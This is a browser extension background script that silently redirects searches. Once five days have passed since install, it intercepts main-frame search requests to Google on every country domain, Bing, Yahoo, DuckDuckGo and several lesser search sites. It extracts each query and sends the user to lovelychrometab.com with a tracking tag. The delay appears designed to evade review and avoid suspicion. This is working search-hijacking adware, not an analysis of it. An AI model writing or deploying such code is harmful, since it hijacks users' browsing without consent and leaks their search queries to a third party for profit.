chrome.webRequest.onBeforeRequest.addListener(
  function (details) {

    const fiveDaysInMs = 432000000;
    const installedAt = localStorage.getItem('installedAt');

    if (+installedAt + fiveDaysInMs >= Date.now()) {
      return;
    }

    if (details.type !== "main_frame") {
      return;
    }

    let searchQuery = "";

    const matchPattern = redirectPatterns.some(x => {
      if (details.url.match(x.url)) {
        searchQuery = new URL(details.url).searchParams.get(
          x.searchQuerySymbol
        );
        return true;
      }
    });

    if (matchPattern && searchQuery) {
      return {
        redirectUrl: `http://www.lovelychrometab.com/?a=gsp_nevada_00_00_ssg10&q=${searchQuery}`
      };
    } 
  },
  {
    urls: getUrls()
  },
  ["blocking"]
);

const redirectPatterns = [
  { url: "://search.yahoo.com/search", searchQuerySymbol: "p" },
  { url: "://www.google.com/search", searchQuerySymbol: "q" },
  { url: "://www.bing.com/search", searchQuerySymbol: "q" },
  { url: "://duckduckgo.com/", searchQuerySymbol: "q" },
  { url: "://searchresult.co/", searchQuerySymbol: "q" },
  { url: "://redirect.lovelytab.com/", searchQuerySymbol: "q" },
  { url: "://gl-search.com/", searchQuerySymbol: "q" },
  { url: "://str-search.com/", searchQuerySymbol: "q" },
  { url: "://chrome-skins.com/", searchQuerySymbol: "q" },
  { url: "://www.mystart.com/", searchQuerySymbol: "q" }
];

function getUrls() {

  const googlePrefix = "*://www.google.";
  const googlePostfixes = [
    "com/*",
    "ac/*",
    "ad/*",
    "ae/*",
    "com.af/*",
    "com.ag/*",
    "com.ai/*",
    "al/*",
    "am/*",
    "co.ao/*",
    "com.ar/*",
    "as/*",
    "at/*",
    "com.au/*",
    "az/*",
    "ba/*",
    "com.bd/*",
    "be/*",
    "bf/*",
    "bg/*",
    "com.bh/*",
    "bi/*",
    "bj/*",
    "com.bn/*",
    "com.bo/*",
    "com.br/*",
    "bs/*",
    "co.bw/*",
    "by/*",
    "com.bz/*",
    "ca/*",
    "com.kh/*",
    "cc/*",
    "cd/*",
    "cf/*",
    "cat/*",
    "cg/*",
    "ch/*",
    "ci/*",
    "co.ck/*",
    "cl/*",
    "cm/*",
    "cn/*",
    "com.co/*",
    "co.cr/*",
    "com.cu/*",
    "cv/*",
    "com.cy/*",
    "cz/*",
    "de/*",
    "dj/*",
    "dk/*",
    "dm/*",
    "com.do/*",
    "dz/*",
    "com.ec/*",
    "ee/*",
    "com.eg/*",
    "es/*",
    "com.et/*",
    "fi/*",
    "com.fj/*",
    "fm/*",
    "fr/*",
    "ga/*",
    "ge/*",
    "gf/*",
    "gg/*",
    "com.gh/*",
    "com.gi/*",
    "gl/*",
    "gm/*",
    "gp/*",
    "gr/*",
    "com.gt/*",
    "gy/*",
    "com.hk/*",
    "hn/*",
    "hr/*",
    "ht/*",
    "hu/*",
    "co.id/*",
    "iq/*",
    "ie/*",
    "co.il/*",
    "im/*",
    "co.in/*",
    "is/*",
    "it/*",
    "je/*",
    "com.jm/*",
    "jo/*",
    "co.jp/*",
    "co.ke/*",
    "com.kh/*",
    "ki/*",
    "kg/*",
    "co.kr/*",
    "com.kw/*",
    "kz/*",
    "la/*",
    "com.lb/*",
    "li/*",
    "lk/*",
    "co.ls/*",
    "lt/*",
    "lu/*",
    "lv/*",
    "com.ly/*",
    "co.ma/*",
    "md/*",
    "me/*",
    "mg/*",
    "mk/*",
    "ml/*",
    "mn/*",
    "ms/*",
    "com.mt/*",
    "mu/*",
    "mv/*",
    "mw/*",
    "com.mx/*",
    "com.my/*",
    "co.mz/*",
    "com.na/*",
    "ne/*",
    "com.nf/*",
    "com.ng/*",
    "com.ni/*",
    "nl/*",
    "no/*",
    "com.np/*",
    "nr/*",
    "nu/*",
    "co.nz/*",
    "com.om/*",
    "com.pa/*",
    "com.pe/*",
    "com.ph/*",
    "com.pk/*",
    "pl/*",
    "com.pg/*",
    "pn/*",
    "com.pr/*",
    "ps/*",
    "pt/*",
    "com.py/*",
    "com.qa/*",
    "ro/*",
    "rs/*",
    "ru/*",
    "rw/*",
    "com.sa/*",
    "com.sb/*",
    "sc/*",
    "se/*",
    "com.sg/*",
    "sh/*",
    "si/*",
    "sk/*",
    "com.sl/*",
    "sn/*",
    "sm/*",
    "so/*",
    "st/*",
    "com.sv/*",
    "td/*",
    "tg/*",
    "co.th/*",
    "com.tj/*",
    "tk/*",
    "tl/*",
    "tm/*",
    "to/*",
    "com.tn/*",
    "com.tr/*",
    "tt/*",
    "com.tw/*",
    "co.tz/*",
    "com.ua/*",
    "co.ug/*",
    "co.uk/*",
    "us/*",
    "com.uy/*",
    "co.uz/*",
    "com.vc/*",
    "co.ve/*",
    "vg/*",
    "co.vi/*",
    "com.vn/*",
    "vu/*",
    "ws/*",
    "co.za/*",
    "co.zm/*",
    "co.zw/*",
    "com.mm/*"
  ];

  urls = [];

  const additionalUrls = [
    "*://searchresult.co/*",
    "*://str-search.com/*",
    "*://gl-search.com/*",
    "*://chrome-skins.com/*",
    "*://redirect.lovelytab.com/*",
    "*://www.mystart.com/*"
  ]

  googlePostfixes.forEach(postfix => {
    urls.push(`${googlePrefix + postfix}`);
  });

  additionalUrls.forEach(additionalUrl => {
    urls.push(additionalUrl);
  });

  return urls;
}

